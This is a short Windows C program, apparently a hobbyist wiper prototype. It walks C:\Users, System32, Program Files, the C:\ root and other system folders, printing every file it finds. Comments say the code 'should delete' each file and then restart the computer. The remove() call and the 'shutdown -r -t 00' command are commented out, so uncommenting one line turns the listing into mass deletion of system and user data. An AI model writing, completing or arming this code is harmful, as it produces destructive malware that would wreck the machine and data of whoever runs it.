# include <stdio.h>
# include <windows.h>
# include <dirent.h>

int rem(char s[50]){  // this function creates list of files and directories and should delete it
	FILE* ff;
	struct dirent *entry;
	printf("%s\n", s);
	DIR* dir = opendir(s);
	char fullname[1024];
	if (dir){
		    printf("\n\n******\n\n");
		    while ((entry = readdir(dir)) != NULL){
			strcpy(fullname,s);
			strcat(fullname,"\\");
			strcat(fullname,entry->d_name);
		    ff = fopen(fullname , "r");
		    if (ff != NULL){
		    	printf("%s\n", entry->d_name);
				fclose(ff);	
 //  				remove(fullname);
			}
			else if (ff == NULL) {
        	printf("%s(directory)\n",entry->d_name);
   			}
   		}
		printf("\n******\n");
		closedir(dir);

		return 1;
	}
	else if(dir == NULL)
	{
		perror("log : dir not found\n");
		return 0;
	}
	else 
	{
		printf("unknown error\n");
		}
}
int main (){
	int x = 1;
	int t = 8;
	while (t--){  // this loop allows to find specific locations
	if(x==1) {
	char a[50] = "C:\\Users";
	rem(a);
	}
	else if (x==2){
	char a[50] = "C:\\Windows\\System32";
	rem(a);
	}
	else if (x==3){
	char a[50] = "C:\\Windows\\System";
	rem(a);
	}
	else if (x==4){
	char a[50] = "C:\\Program Files";
	rem(a);
	}
	else if (x==5){
	char a[50] = "C:\\Program Files (x86)";
	rem(a);
	}
	else if (x==6){
	char a[50] = "C:\\";
	rem(a);
	}
	else if (x==7){
	char a[50] = "C:\\Documents and Settings";
	rem(a);
	}
//	rem(a);
	x++;
	}
//system("shutdown -r -t 00");    // should restar computer
}
